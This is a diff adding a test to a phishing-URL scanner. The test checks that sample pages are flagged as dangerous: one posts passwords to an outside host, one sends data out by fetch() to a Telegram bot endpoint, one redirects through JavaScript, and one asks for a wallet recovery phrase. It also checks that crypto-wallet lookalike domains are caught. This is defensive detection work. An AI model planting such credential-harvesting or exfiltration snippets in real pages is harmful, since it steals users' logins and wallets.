@@ -1135,6 +1135,23 @@ def test_blind_mode_ignores_lists():
         _restore()
 
 
+def test_page_tricks_and_crypto_lookalikes():
+    from scanners.url_scanner import _page_tricks
+    t = _page_tricks('<form action="https://collect-x.top/p.php"><input type=password></form>'
+                     '<script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script>', "https://shop-x.com/login")
+    assert t["telegram_exfil"] and t["form_to"] == "collect-x.top", t
+    assert _page_tricks('<form action="/login"><input type=password></form>', "https://bank.example.com/")["form_to"] == ""
+    assert _page_tricks("<script>window.location='https://evil-x.top/a'</script>", "https://a.com/")["js_redirect"]
+    r = _scan_online("https://plain-shop-example.com/", page={"has_password": True, "telegram_exfil": True, "title": "Sign in"})
+    assert r["verdict"] == "DANGEROUS", (r["risk_score"], r["findings"])
+    r = _scan_online("https://plain-shop-example.com/", page={"text": "enter your 12-word recovery phrase to restore your wallet"})
+    assert r["verdict"] == "DANGEROUS", (r["risk_score"], r["findings"])
+    for u in ["http://ur-exods.pages.dev/x", "http://start-ledgerlive-com-web.typedream.app", "https://my-metamsk-wallet.com"]:
+        assert scan_url(u)["verdict"] == "DANGEROUS", u
+    for u in ["https://www.ledgerbook-accounting.com", "https://owata-net.com", "https://www.ledger.com"]:
+        assert scan_url(u)["verdict"] != "DANGEROUS", (u, scan_url(u)["findings"])
+
+
 if __name__ == "__main__":
     tests = [(n, f) for n, f in sorted(globals().items()) if n.startswith("test_") and callable(f)]
     failed = 0
